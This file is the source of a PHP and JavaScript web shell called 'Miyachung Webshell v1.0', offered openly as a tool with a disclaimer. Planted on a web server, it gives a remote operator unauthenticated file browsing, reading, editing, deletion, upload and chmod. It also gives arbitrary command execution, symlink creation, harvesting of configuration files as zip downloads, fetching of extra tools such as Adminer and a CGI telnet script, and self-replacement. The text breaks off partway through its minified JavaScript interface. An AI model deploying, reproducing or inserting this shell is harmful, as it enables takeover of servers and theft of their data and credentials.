<?php
/*
    * Miyachung Webshell v1.0
    * PHP & Javascript based web shell
    * Authored : miyachung

     DISCLAIMER

     - This script has few of abilities on a web server,some of them might be harmful
       If you are decided to use this script,you have to know that script's author does not takes any responsibility on any harmful use
*/

@ob_start();
@ini_set('max_execution_time',0);
@ini_set('safe_mode','Off');
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);


$helpers = new helpers;
if($_POST){
    header("Content-type: application/json");

    if(isset($_POST['list_dir'])){

        $list = $helpers->list_dir(base64_decode($_POST['list_dir']));

        if($list === false){
            $output['status'] = 'no_dir';
            exit(json_encode($output));
        }
        exit(json_encode($list)); 

    }elseif(isset($_POST['remove_file'])){

        $remove = $helpers->remove_file(base64_decode($_POST['remove_file']));

        if($remove){
            $output['status'] = 'removed';
        }else{
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    }elseif(isset($_POST['chmod_target']) && isset($_POST['chmod'])){

        $setchmod = $helpers->set_chmod(base64_decode($_POST['chmod_target']),base64_decode($_POST['chmod']));

        if($setchmod){
            $output['status'] = 'ok';
        }else{
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    }elseif(isset($_POST['rename_target']) && isset($_POST['new_name']) && isset($_POST['old_name'])){
        $rename = $helpers->rename(base64_decode($_POST['rename_target']),$_POST['new_name'],$_POST['old_name']);

        if($rename){
            $output['status'] = 'ok';
        }else{
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    }elseif(isset($_POST['read_file'])){

        $pathinfo  = pathinfo(base64_decode($_POST['read_file']));

        if(stristr($pathinfo['extension'],'zip') || stristr($pathinfo['extension'],'rar') || stristr($pathinfo['extension'],'tar') || stristr($pathinfo['extension'],'tar.gz') || stristr($pathinfo['extension'],'7z')){
            $output['status'] = 'failed';
            exit(json_encode($output));
        }elseif(stristr($pathinfo['extension'],'m4a') || stristr($pathinfo['extension'],'flac') || stristr($pathinfo['extension'],'mp3') || stristr($pathinfo['extension'],'wav') || stristr($pathinfo['extension'],'aac') || stristr($pathinfo['extension'],'wma')){
            $output['audio'] = base64_decode($_POST['read_file']);
            $output['type']  = @mime_content_type(base64_decode($_POST['read_file']));
            exit(json_encode($output));
        }elseif(stristr($pathinfo['extension'],'mp4') || stristr($pathinfo['extension'],'avi') || stristr($pathinfo['extension'],'mov') || stristr($pathinfo['extension'],'wmv') || stristr($pathinfo['extension'],'flv') || stristr($pathinfo['extension'],'avchd') || stristr($pathinfo['extension'],'mkv') || stristr($pathinfo['extension'],'3gp')){
            $output['video'] = base64_decode($_POST['read_file']);
            $output['type'] = @mime_content_type(base64_decode($_POST['read_file']));
            exit(json_encode($output));
        }

        $read_file  = @file_get_contents(base64_decode($_POST['read_file']));
    
        if($read_file !== false){
            if(stristr($pathinfo['extension'],'jpg') || stristr($pathinfo['extension'],'png') || stristr($pathinfo['extension'],'bmp') || stristr($pathinfo['extension'],'gif') || stristr($pathinfo['extension'],'jpeg') || stristr($pathinfo['extension'],'webp') || stristr($pathinfo['extension'],'svg')){
                $output['data_url'] = 'data: '.mime_content_type(base64_decode($_POST['read_file'])).';base64,'.base64_encode($read_file);
            }

            $output['content'] = base64_encode($read_file);
        }else{
            $output['status'] = 'failed';
        }
        exit(json_encode($output));

    }elseif(isset($_POST['edit_file'])){
        if(isset($_POST['rename'])){
            if(@rename(base64_decode($_POST['edit_file']),base64_decode($_POST['rename']))){
                if(isset($_POST['content'])){
                    if(@file_put_contents(base64_decode($_POST['rename']),base64_decode($_POST['content']),LOCK_EX)){
                        $output['status']  = @basename(base64_decode($_POST['rename']));
                        $output['old_name']= @basename(base64_decode($_POST['edit_file']));
                    }else{
                        $output['status'] = 'failed';
                    }
                }else{
                    $output['status']  = @basename(base64_decode($_POST['rename']));
                    $output['old_name']= @basename(base64_decode($_POST['edit_file']));
                }
               
            }else{
                $output['status'] = 'failed';
            }
            
        }else{
            if(isset($_POST['content'])){
                if(@file_put_contents(base64_decode($_POST['edit_file']),base64_decode($_POST['content']),LOCK_EX)){
                    $output['status'] = 'ok';
                }else{
                    $output['status'] = 'failed';
                }
            }
          
        }
      
        exit(json_encode($output));
    }elseif(isset($_POST['create_file']) && isset($_POST['directory'])){
        if(!@file_exists(base64_decode($_POST['directory']).'/'.base64_decode($_POST['create_file'])) || !@is_dir(base64_decode($_POST['directory']).'/'.base64_decode($_POST['create_file']))){
            if(@touch(base64_decode($_POST['directory']).'/'.base64_decode($_POST['create_file']))){
                $output['status'] = 'ok';
            }else{
                $output['status'] = 'failed';
            }
        }else{
            $output['status'] = 'already_exists';
        }
    
        exit(json_encode($output));
    }elseif(isset($_POST['create_dir']) && isset($_POST['directory'])){
        if(!@file_exists(base64_decode($_POST['directory']).'/'.base64_decode($_POST['create_dir'])) || !@is_dir(base64_decode($_POST['directory']).'/'.base64_decode($_POST['create_dir']))){
            if(@mkdir(base64_decode($_POST['directory']).'/'.base64_decode($_POST['create_dir']))){
                $output['status'] = 'ok';
            }else{
                $output['status'] = 'failed';
            }
        }else{
            $output['status'] = 'already_exists';
        }
        exit(json_encode($output));
    }elseif(isset($_FILES['files']) && isset($_POST['directory'])){
  
        foreach($_FILES['files']['name'] as $key => $name){
            $upload = $helpers->file_upload($_FILES['files']['tmp_name'][$key],$name,base64_decode($_POST['directory']));

            if($upload){
                $output['status'] = 'ok';
            }else{
                $output['status'] = 'failed';
            }
        }
        exit(json_encode($output));

    }elseif(isset($_POST['command']) && isset($_POST['directory'])){
        
        $cmd = $helpers->run_cmd(base64_decode($_POST['command']),base64_decode($_POST['directory']));

        if($cmd){
            $output['status'] = base64_encode($cmd);
        }else{
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    }elseif(isset($_POST['symlink_target'])){
        $symlink = $helpers->create_symlink(base64_decode($_POST['symlink_target']));

        if($symlink){
            $output['status'] = base64_encode(htmlentities($symlink));
        }else{
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    }elseif(isset($_POST['search_location']) && isset($_POST['search_keyword']) && isset($_POST['search_type'])){

        $command = $helpers->run_cmd($helpers->prepare_search_cmd($_POST['search_location'],$_POST['search_keyword'],$_POST['search_type']));

        if($command){
            $output['status'] = base64_encode($command);
        }else{
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    }elseif(isset($_POST['download_cfg'])){
        $zipAll = $helpers->download_configs(base64_decode($_POST['download_cfg']));

        if($zipAll == false){
            $output['status'] = 'failed';
        }else{
            $output['url'] = $zipAll;
        }
        exit(json_encode($output));
    }elseif(isset($_POST['update_content'])){

        if(@file_put_contents(basename($_SERVER['PHP_SELF']),base64_decode($_POST['update_content']))){
            $output['status'] = 'ok';
        }else{
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    }

  exit;
}
if(isset($_GET['download_file'])){

    $file     = base64_decode($_GET['download_file']);
    
    $download = $helpers->download_file($file);

    if($download === false){
        print '<script>window.history.back();</script>;';
    }
    exit;
}elseif(isset($_GET['adminer'])){
    
    $adminer = $helpers->get_adminer();
    if($adminer){
        $output['status'] = 'ok';
    }else{
        $output['status'] = 'failed';
    }

    exit(json_encode($output));
}elseif(isset($_GET['cgitelnet'])){
    $cgitelnet = $helpers->get_cgitelnet();

    if($cgitelnet){
        $output['status'] = 'ok';
    }else{
        $output['status'] = 'failed';
    }

    exit(json_encode($output));
}elseif(isset($_GET['play_audio'])){
    $audioPath = $_GET['play_audio'];
    header('Cache-Control: no-cache');
    header('Content-Transfer-Encoding: binary');
    header('Content-Type: audio/mp3'); 
    header('Content-Length: ' . filesize($audioPath));
    header('Accept-Ranges: bytes');

    readfile($audioPath); 

    exit;
}elseif(isset($_GET['play_video'])){
    $videoPath = $_GET['play_video'];
    header('Cache-Control: no-cache');
    header('Content-Transfer-Encoding: binary');
    header('Content-Type: video/mp4'); 
    header('Content-Length: ' . filesize($videoPath));
    header('Accept-Ranges: bytes');

    readfile($videoPath); 
    exit;
}elseif(isset($_GET['download_folder'])){
    if(is_dir(base64_decode($_GET['download_folder']))){
        $zip_folder = $helpers->download_as_zip(base64_decode($_GET['download_folder']));

        if($zip_folder == false){
            print '<script>window.history.back();</script>;';
        }else{
            $download_folder = $helpers->download_file($zip_folder,true);
    
            if($download_folder == false){
                print '<script>window.history.back();</script>;';
            }
            exit;
        }
    }else{
        print '<script>window.history.back();</script>;';
    }
   
    exit;

}elseif(isset($_GET['download_cfg_file'])){

    $download_cfg = $helpers->download_file(base64_decode($_GET['download_cfg_file']),true);

    if($download_cfg == false){
        print '<script>window.history.back();</script>;';
    }
    exit;
    
}
if(!function_exists('posix_getgrgid')){
    
    function posix_getgrgid($gid)
    {
        return false;
    }
} 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style type="text/css">
        @import url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta2/css/all.min.css);*{margin:0;padding:0;box-sizing:border-box;font-family:'Sagoe UI',sans-serif;outline:0;list-style:none;text-decoration:none;color:#fff;-webkit-font-smoothing:antialiased}body,html{width:100%;height:100%;overflow:hidden}body{background:#222831;display:flex;align-items:center;justify-content:center}.holder{width:85%;min-width:500px;min-height:400px}.mwsbox{background:#3a4a63;padding:10px 15px;border-radius:10px;box-shadow:-20px 30px 30px -20px rgba(0,0,0,.8);position:relative;overflow:hidden;width:100%;height:100%}.mwsbox .bottom-menu{position:absolute;bottom:0;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.75);z-index:999;border-radius:10px 10px 0 0}.mwsbox .bottom-menu ul{display:flex}.mwsbox .bottom-menu ul li{padding:10px 20px;cursor:pointer;display:flex;align-items:center;justify-content:center;border-radius:5px;transition:350ms all}.mwsbox .bottom-menu ul li span{display:none;font-weight:700}.mwsbox .bottom-menu ul li:hover{background:rgba(255,255,255,.5)}.mwsbox .bottom-menu ul li:hover>span{display:block;margin-left:5px}.mwsbox .title{width:100%;padding-bottom:7px;border-bottom:2px solid rgba(255,255,255,.15);margin-bottom:7px;flex-wrap:wrap}.mwsbox .title ul{display:flex;flex-direction:column}.mwsbox .title ul li span{font-weight:700;color:#fff;font-size:16px;white-space:nowrap;margin-right:5px}.mwsbox .title ul li{display:flex;align-items:center;font-size:15px;color:rgba(255,255,255,.95)}.mwsbox .title ul li p{word-break:break-all}.mwsbox .title h3{width:100%;background:rgba(34,40,49,.2);text-align:center;margin-bottom:5px;font-size:32px;letter-spacing:3px;font-weight:600;font-weight:500;color:#fff;border-radius:5px;padding:5px 0;font-family:'trebuchet ms';text-transform:uppercase}.mwsbox .inner{width:100%;padding:0 10px 5px 0;max-height:490px;min-height:490px;height:100%;overflow:auto}.mwsbox .inner::-webkit-scrollbar{width:7px}.mwsbox .inner::-webkit-scrollbar-track{background-color:#e4e4e4;border-radius:50px}.mwsbox .inner::-webkit-scrollbar-thumb{background-color:#222831;border-radius:50px}.mwsbox .inner table{width:100%;display:none}.mwsbox .inner table thead tr th{border-bottom:1px solid rgba(255,255,255,.08);text-align:right;padding-bottom:10px;font-size:15px;font-weight:600}.mwsbox .inner table tbody tr td{padding:8px 0;border-bottom:1px solid rgba(255,255,255,.02);font-size:14px;font-weight:600;text-align:right}.mwsbox .inner table tbody tr td i{font-size:17px}.mwsbox .inner table tbody tr td:hover span{text-decoration:underline}.mwsbox .inner table tbody tr td span{cursor:pointer}.mwsbox .inner table tbody tr:last-child td{border-bottom:none}.mwsbox .inner table tbody tr td .icons{display:flex;align-items:center;text-align:right;justify-content:flex-end}.mwsbox .inner table tbody tr td .icons i{padding:0 5px;cursor:pointer;display:block}.mwsbox .inner .loaderhold{width:100%;display:flex;align-items:center;justify-content:center}.mwsbox .inner .loaderhold .loader{margin-top:20px;display:none;border:5px solid #f3f3f3;border-top:5px solid #555;border-radius:50%;width:100px;height:100px;animation:spin 1.5s linear infinite}.mwsbox .process-screen{width:calc(75% - 200px);position:absolute;min-width:350px;background:#fff;border-radius:10px;box-shadow:10px 35px 35px -30px rgba(0,0,0,.8);padding:15px;z-index:9999;top:-50%;left:50%;transform:translate(-50%,-50%);visibility:hidden;max-height:700px;overflow:auto;transition:.2s all;opacity:0}.mwsbox .process-screen::-webkit-scrollbar{width:8px}.mwsbox .process-screen::-webkit-scrollbar-track{background-color:#e4e4e4;border-radius:50px}.mwsbox .process-screen::-webkit-scrollbar-thumb{background-color:gray;border-radius:50px}.mwsbox .process-screen h3{color:#222;font-size:16px;padding-bottom:5px;border-bottom:1px solid #ccc;margin-bottom:10px}.mwsbox .process-screen form{display:flex;flex-direction:column}.mwsbox .process-screen input[type=text]{width:100%;height:45px;padding-left:10px;border:1px solid #aaa;color:#333;background:#ccc}.mwsbox .process-screen input[type=text]:hover{border:1px solid #000}.mwsbox .process-screen input::placeholder{color:gray}.mwsbox .process-screen textarea{width:100%;height:250px;resize:none;padding:5px;border:1px solid #aaa;color:#333;background:#ccc}.mwsbox .process-screen textarea:hover{border:1px solid #000}.mwsbox .process-screen button{width:200px;height:45px;padding:10px;background:#0b8ad9;color:#fff;border:none;font-weight:700;text-transform:uppercase;font-size:16px;margin-top:10px;cursor:pointer;transition:250ms all}.mwsbox .process-screen button:hover{background:#0078c2}.mwsbox .process-screen label{color:#222;font-weight:600;margin-bottom:5px}.mwsbox .process-screen select{width:100%;height:45px;border:1px solid #aaa;padding-left:10px;color:rgba(0,0,0,.5);background:#ccc}.mwsbox .process-screen select option{color:rgba(0,0,0,.5)}.mwsbox .process-screen .cmd_result{word-break:break-all;width:100%;padding:10px;margin-top:10px;background:#222;border:1px solid rgba(255,255,255,.8);margin-bottom:10px;color:#fff;font-weight:700;font-size:14px;max-height:250px;overflow:auto}.mwsbox .process-screen .cmd_result::-webkit-scrollbar{width:8px}.mwsbox .process-screen .cmd_result::-webkit-scrollbar-track{background-color:#e4e4e4;border-radius:50px}.mwsbox .process-screen .cmd_result::-webkit-scrollbar-thumb{background-color:gray;border-radius:50px}.mwsbox .popup-box{position:absolute;width:300px;min-width:250px;border-radius:5px;padding:10px;font-size:14px;font-weight:700;box-shadow:15px 12px 20px -15px rgba(0,0,0,.9);color:#fff;transition:250ms all;right:-9999px;top:10%;opacity:0;visibility:hidden;z-index:50}#path strong{padding-left:2px;}#path strong:hover{text-decoration:underline}.popup-box.alert{background:#bd0404}.popup-box.success{background:#029c11}@media only screen and (max-height:900px){.mwsbox{height:800px;width:100%;overflow:auto}.bottom-menu{top:0;max-height:50px;transform:none}.holder{width:100%}}@media only screen and (max-width:450px){.holder{width:100%;height:100%;overflow:auto}.bottom-menu{top:0;max-height:50px;transform:none}}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    </style>
    <script>
       let working_dir,release="1.0";function list_dir(e){void 0===e&&(e=".");let t=document.querySelector(".inner table"),n=document.querySelector(".inner .loaderhold .loader");t.style.display="none",n.style.display="block";let l=new FormData;l.append("list_dir",btoa(e));let i=new XMLHttpRequest;i.open("post",basename(),!0),i.onload=function(){if(4==i.readyState){var e=JSON.parse(this.response);if(void 0!==e.status||null==e.name||null==e.name||""==e.name)show_popup("Can not change dir!",3e3,"alert"),n.style.display="none",t.style.display="table",document.getElementById("curr_dir").value=working_dir;else{let l=document.querySelector(".inner table tbody"),i=l.querySelectorAll("tr");for(let e=0;e<i.length;e++)i[e].parentNode.removeChild(i[e]);for(let t=0;t<e.name.length;t++){let n=l.insertRow();n.setAttribute("id","tr_"+t);let i=n.insertCell(),o=n.insertCell(),s=n.insertCell(),a=n.insertCell(),r=n.insertCell(),c=n.insertCell();if(i.style.textAlign="center",o.style.textAlign="left","directory"==e.type[t])".."!=e.name[t]?(i.insertAdjacentHTML("afterbegin",'<i class="fas fa-folder" style="color:#d6b172;"></i>'),c.insertAdjacentHTML("afterbegin",'<div class="icons"><i onclick="download_folder_process(\''+e.path[t].replace(/\\/g,"/")+'\');" class="fas fa-file-archive" style="color:#CB3637" title="Download as zip"></i><i class="fas fa-edit" style="color:#ffcf41" title="Rename" onclick="rename_dir(\''+e.path[t].replace(/\\/g,"/")+"','"+n.getAttribute("id")+"','"+e.name[t]+'\');" style="color:#fff;"></i><i class="fas fa-trash-alt" title="Remove" onclick="remove_file(\''+e.path[t].replace(/\\/g,"/")+"','"+n.getAttribute("id")+'\');" style="color:#f55858;"></i></div>'),o.insertAdjacentHTML("afterbegin","<span onclick=\"list_dir('"+e.path[t].replace(/\\/g,"/")+"');\">"+e.name[t]+"</span>")):(i.insertAdjacentHTML("afterbegin",'<i class="fas fa-folder" style="color:#d6b172;"></i>'),c.insertAdjacentHTML("afterbegin",""),o.insertAdjacentHTML("afterbegin","<span onclick=\"list_dir('"+e.path[t].replace(/\\/g,"/")+'\');"><i class="fas fa-arrow-left"></i></span>'));else{let l=e.name[t].substring(e.name[t].lastIndexOf(".")+1);"js"==l||"JS"==l?i.insertAdjacentHTML("afterbegin",'<i class="fab fa-js" style="color:orange"></i>'):"sql"==l||"db"==l?i.insertAdjacentHTML("afterbegin",'<i class="fas fa-database"></i>'):"php"==l||"PHP"==l?i.insertAdjacentHTML("afterbegin",'<i class="fab fa-php" style="color:#8A90BE"></i>'):"py"==l||"PY"==l?i.insertAdjacentHTML("afterbegin",'<i class="fab fa-python" style="color:#F1BD22"></i>'):"txt"==l||"TXT"==l?i.insertAdjacentHTML("afterbegin",'<i class="fas fa-file-alt"></i>'):"zip"==l||"rar"==l||"7z"==l||"tar"==l||"tar.gz"==l||"ZIP"==l||"RAR"==l||"7Z"==l||"TAR"==l||"TAR.GZ"==l?i.insertAdjacentHTML("afterbegin",'<i class="far fa-file-archive" style="color:#8F1D38"></i>'):"css"==l||"CSS"==l?i.insertAdjacentHTML("afterbegin",'<i class="fab fa-css3-alt" style="color:#3D58E7"></i>'):"jpg"==l||"gif"==l||"png"==l||"jpeg"==l||"bmp"==l||"webp"==l||"svg"==l||"JPG"==l||"GIF"==l||"PNG"==l||"JPEG"==l||"BMP"==l||"WEBP"==l||"SVG"==l?i.insertAdjacentHTML("afterbegin",'<i class="fas fa-file-image"></i>'):"html"==l||"htm"==l||"shtml"==l||"HTML"==l||"HTM"==l||"SHTML"==l?i.insertAdjacentHTML("afterbegin",'<i class="fab fa-html5" style="color:#EA682D"></i>'):"java"==l||"jar"==l||"JAR"==l||"JAVA"==l?i.insertAdjacentHTML("afterbegin",'<i class="fab fa-java" style="color:#276EBB"></i>'):"pdf"==l||"PDF"==l?i.insertAdjacentHTML("afterbegin",'<i class="fas fa-file-pdf" style="color:#F7F7F7"></i>'):"doc"==l||"docx"==l||"DOC"==l||"DOCX"==l?i.insertAdjacentHTML("afterbegin",'<i class="fas fa-file-word" style="color:#2463B1"></i>'):"m4a"==l||"M4A"==l||"flac"==l||"FLAC"==l||"mp3"==l||"MP3"==l||"wav"==l||"aac"==l||"WAV"==l||"wma"==l||"WMA"==l||"AAC"==l?i.insertAdjacentHTML("afterbegin",'<i class="fas fa-file-audio"></i>'):"csv"==l||"CSV"==l||"xls"==l||"XLS"==l||"xlsx"==l||"XLSX"==l?i.insertAdjacentHTML("afterbegin",'<i class="fas fa-file-excel" style="color:#43BF7F"></i>'):"potx"==l||"POTX"==l||"ppsx"==l||"PPSX"==l||"pptx"==l||"PPTX"==l?i.insertAdjacentHTML("afterbegin",'<i class="fas fa-file-powerpoint" style="color:#BA4424"></i>'):"MP4"==l||"mp4"==l||"avi"==l||"AVI"==l||"MOV"==l||"mov"==l||"WMV"==l||"wmv"==l||"FLV"==l||"flv"==l||"AVCHD"==l||"avchd"==l||"mkv"==l||"MKV"==l||"3GP"==l||"3gp"==l?i.insertAdjacentHTML("afterbegin",'<i class="fas fa-file-video"></i>'):i.insertAdjacentHTML("afterbegin",'<i class="fas fa-file"></i>'),c.insertAdjacentHTML("afterbegin",'<div class="icons"><i class="fas fa-edit" style="color:#ffcf41" title="Edit" onclick="edit_file(\''+e.path[t].replace(/\\/g,"/")+"','"+n.getAttribute("id")+'\');" style="color:#fff;"></i><i class="fas fa-trash-alt" title="Remove" onclick="remove_file(\''+e.path[t].replace(/\\/g,"/")+"','"+n.getAttribute("id")+'\');" style="color:#f55858;"></i><i class="fas fa-file-download" title="Download" onclick="download_file(\''+e.path[t].replace(/\\/g,"/")+'\');" style="color:#fff"></i></div>'),o.insertAdjacentHTML("afterbegin",'<span class="toggle" onclick="edit_file(\''+e.path[t].replace(/\\/g,"/")+"','"+n.getAttribute("id")+"');\">"+e.name[t]+"</span>")}s.innerText=e.size[t],a.innerText=e.modify[t],r.insertAdjacentHTML("afterbegin",'<span class="toggle" onclick="set_chmod(\''+e.path[t].replace(/\\/g,"/")+"','"+e.perm_num[t]+"');\">"+e.perms[t]+"</span>")}n.style.display="none",t.style.display="table",document.getElementById("curr_dir").value=e.current_dir,document.getElementById("read_file").value=e.current_dir,working_dir=e.current_dir;let o=separate_path(),s="";for(let e=0;e<o[0].length;e++){let t=o[1][e];"/"==o[0][e]?s+="<strong style='cursor:pointer;font-size:16px;' onclick='list_dir(\""+t+"\")'>"+o[0][e]+"</strong>":s+="<strong style='cursor:pointer;font-size:16px;' onclick='list_dir(\""+t+"\")'>"+o[0][e]+"/</strong>"}document.getElementById("path").innerHTML=s}}},i.send(l)}function remove_file(e,t){if(window.confirm("Do you really want to remove this item?")){let n=document.getElementById(t),l=new FormData;l.append("remove_file",btoa(e));let i=new XMLHttpRequest;i.open("post",basename(),!0),i.onload=function(){if(4==i.readyState){if("removed"!=JSON.parse(this.response).status)return show_popup("This file/folder cannot be removed,check permissions!",3e3,"alert"),!1;n.parentNode.removeChild(n),show_popup("Removed successfully!",2500,"success")}},i.send(l)}}function edit_file(e,t){empty_process_screen();let n=document.querySelector(".process-screen"),l=document.createElement("h3");l.innerHTML="Edit file "+e;let i=document.createElement("img");i.style.display="none",i.style.width="250px",i.style.height="250px";let o=document.createElement("audio");o.controls=!0,o.style.display="none",o.style.marginTop="10px";let s=document.createElement("video");s.controls=!0,s.width=350,s.height=350,s.style.display="none",s.style.marginTop="10px";let a=document.createElement("form");a.setAttribute("id","editfile"),a.setAttribute("onsubmit","event.preventDefault();");let r=document.createElement("input");r.value=e,r.type="text";let c=document.createElement("textarea");c.value="Loading...";let d=document.createElement("button");d.innerHTML="EDIT";let p=new FormData;p.append("read_file",btoa(e));let u=new XMLHttpRequest;u.open("post",basename(),!0),u.onload=function(){if(4==u.readyState){let l=JSON.parse(this.response);if(void 0!==l.data_url)c.parentNode.removeChild(c),i.src=l.data_url,i.style.display="block",d.setAttribute("onclick",'edit_file_process("'+e+'","'+t+'","nosave");');else if(l.audio){c.parentNode.removeChild(c);let e=document.createElement("source");e.src=basename()+"?play_audio="+l.audio,o.appendChild(e),o.style.display="block"}else if(l.video){c.parentNode.removeChild(c);let e=document.createElement("source");e.src=basename()+"?play_video="+l.video,s.appendChild(e),s.style.display="block"}else d.setAttribute("onclick",'edit_file_process("'+e+'","'+t+'","save");'),!1!==l.content?c.value=atob(l.content):(show_popup("Can not read this file!",3e3,"alert"),n.style.visibility="hidden",n.style.opacity="0",n.style.top="-50%")}},u.send(p),a.appendChild(r),a.appendChild(o),a.appendChild(s),a.appendChild(i),a.appendChild(c),a.appendChild(d),n.appendChild(l),n.appendChild(a),n.style.visibility="visible",n.style.opacity="1",n.style.top="50%"}function edit_file_process(e,t,n){let l=new FormData,i=document.getElementById("editfile"),o=i.querySelector("button");if("nosave"!==n){let e=i.querySelector("textarea").value;l.append("content",btoa(e))}let s=i.querySelector("input").value;l.append("edit_file",btoa(e)),s!==e&&l.append("rename",btoa(s)),o.disabled=!0,o.innerHTML="EDITING...";let a=new XMLHttpRequest;a.open("post",basename(),!0),a.onload=function(){if(4==a.readyState){let n=JSON.parse(this.response);if("failed"==n.status)show_popup("Can not edit this file!",3e3,"alert");else if("ok"==n.status)show_popup("File has edited successfully!",3e3,"success");else if(show_popup("File has edited successfully!",3e3,"success"),null!==t||""!==t){let l=document.getElementById(t).getElementsByTagName("td"),i=document.getElementById("screen"),o=i.querySelector("textarea").value;i.querySelector("button").disabled=!1,i.querySelector("button").innerHTML="EDIT",i.innerHTML=i.innerHTML.replace(new RegExp(n.old_name,"g"),n.status),i.querySelector("input").value=e.replace(new RegExp(n.old_name,"g"),n.status),i.querySelector("textarea").value=o;for(let e=0;e<l.length;e++)l[e].innerHTML=l[e].innerHTML.replace(new RegExp(n.old_name,"g"),n.status)}o.disabled=!1,o.innerHTML="EDIT"}},a.send(l)}function readfile(){edit_file(document.getElementById("read_file").value,"")}function download_file(e){window.location=basename()+"?download_file="+btoa(e)}function rename_dir(e,t,n){empty_process_screen();let l=document.querySelector(".process-screen"),i=document.createElement("h3");i.innerHTML="Rename directory "+e;let o=document.createElement("form");o.setAttribute("id","renamedir"),o.setAttribute("onsubmit","event.preventDefault();");let s=document.createElement("input"),a=document.createElement("button");a.innerHTML="RENAME",a.setAttribute("onclick",'rename_dir_process("'+e+'","'+t+'","'+n+'");'),s.type="text",s.value=n,o.appendChild(s),o.appendChild(a),l.appendChild(i),l.appendChild(o),l.style.visibility="visible",l.style.opacity="1",l.style.top="50%"}function rename_dir_process(e,t,n){let l=document.getElementById("renamedir"),i=l.querySelector("button"),o=l.querySelector("input");if(""==o.value)show_popup("Empty field!",3e3,"alert");else if(o.value==n)show_popup("Name is same with the old one!",3e3,"alert");else{i.disabled=!0,i.innerHTML="CHANGING...";let l=new FormData;l.append("new_name",o.value),l.append("rename_target",btoa(e)),l.append("old_name",n);let s=new XMLHttpRequest;s.open("post",basename(),!0),s.onload=function(){if(4==s.readyState){if("failed"==JSON.parse(this.response).status)show_popup("Can not change the name!",3e3,"alert"),o.value=n;else{show_popup("Name change applied successfully!",3e3,"success");let e=document.getElementById(t).getElementsByTagName("td"),l=document.getElementById("screen");l.innerHTML=l.innerHTML.replace(new RegExp(n,"g"),o.value),l.querySelector("input").value=o.value;for(let t=0;t<e.length;t++)e[t].innerHTML=e[t].innerHTML.replace(new RegExp(n,"g"),o.value)}document.querySelector("#renamedir button").disabled=!1,document.querySelector("#renamedir button").innerHTML="RENAME"}},s.send(l)}}function set_chmod(e,t){empty_process_screen();let n=document.querySelector(".process-screen"),l=document.createElement("h3");l.innerHTML="Set chmod of "+e;let i=document.createElement("form");i.setAttribute("id","setchmod"),i.setAttribute("onsubmit","event.preventDefault();");let o=document.createElement("input"),s=document.createElement("button");s.innerHTML="SET",s.setAttribute("onclick",'set_chmod_file("'+e+'","'+t+'");'),o.type="text",o.value=t,i.appendChild(o),i.appendChild(s),n.appendChild(l),n.appendChild(i),n.style.visibility="visible",n.style.opacity="1",n.style.top="50%"}function set_chmod_file(e,t){let n=document.getElementById("setchmod"),l=n.querySelector("button"),i=n.querySelector("input");if(""==i.value||isNaN(i.value))show_popup("Empty/non-numeric field is not allowed!",3e3,"alert");else{l.disabled=!0,l.innerHTML="SETTING...";let n=new FormData;n.append("chmod",btoa(i.value)),n.append("chmod_target",btoa(e));let o=new XMLHttpRequest;o.open("post",basename(),!0),o.onload=function(){if(4==o.readyState){"failed"==JSON.parse(this.response).status?(show_popup("Can not process this chmod setting to target!",3e3,"alert"),i.value=t):(show_popup("Chmod settings applied successfully!",3e3,"success"),list_dir(working_dir)),l.disabled=!1,l.innerHTML="SET"}},o.send(n)}}function show_popup(e,t,n){let l;(l="alert"==n?document.querySelector(".popup-box.alert"):document.querySelector(".popup-box.success")).innerHTML=e,l.style.right="10px",l.style.opacity="1",l.style.visibility="visible",setTimeout(function(){l.style.right="-9999px",l.style.opacity="0",l.style.visibility="hidden"},t)}function empty_process_screen(){document.querySelector(".mwsbox .process-screen").innerHTML=""}function change_dir(){list_dir(document.getElementById("curr_dir").value)}function create_file(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="Create a file";let n=document.createElement("form");n.setAttribute("id","createfile"),n.setAttribute("onsubmit","event.preventDefault();");let l=document.createElement("input"),i=document.createElement("button");i.innerHTML="Create",i.setAttribute("onclick","create_file_process();"),l.type="text",l.value="",l.setAttribute("required",""),n.appendChild(l),n.appendChild(i),e.appendChild(t),e.appendChild(n),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function create_file_process(){let e=document.getElementById("createfile"),t=e.querySelector("button"),n=e.querySelector("input"),l=document.getElementById("curr_dir").value;if(""!==n.value){let e=new FormData;e.append("create_file",btoa(n.value)),e.append("directory",btoa(l)),t.disabled=!0,t.innerHTML="CREATING...";let i=new XMLHttpRequest;i.open("post",basename(),!0),i.onload=function(){if(4==i.readyState){let e=JSON.parse(this.response);"ok"==e.status?(show_popup("File has created successfully!",3e3,"success"),list_dir(l)):"failed"==e.status?(show_popup("File can not be created!",3e3,"alert"),n.value=""):(show_popup("This file/folder is already exists!",3e3,"alert"),n.value=""),t.disabled=!1,t.innerHTML="CREATE"}},i.send(e)}}function create_dir(){empty_process_screen();let e=document.querySelector(".process-screen"),t=document.createElement("h3");t.innerHTML="Create a directory";let n=document.createElement("form");n.setAttribute("id","createdir"),n.setAttribute("onsubmit","event.preventDefault();");let l=document.createElement("input"),i=document.createElement("button");i.innerHTML="Create",i.setAttribute("onclick","create_dir_process();"),l.type="text",l.value="",l.setAttribute("required",""),n.appendChild(l),n.appendChild(i),e.appendChild(t),e.appendChild(n),e.style.visibility="visible",e.style.opacity="1",e.style.top="50%"}function create_dir_process(){let e=document.getElementById("createdir").querySelector("input"),t=document.getElementById("curr_dir").value;if(""!==e.value){let n=new FormData;n.append("create_dir",btoa(e.value)),n.append("directory",btoa(t));let l=new XMLHttpRequest;l.open("post",basename(),!0),l.onload=function(){if(4==l.readyState){let n=JSON.parse(this.response);"ok"==n.status?(show_popup("Directory has created 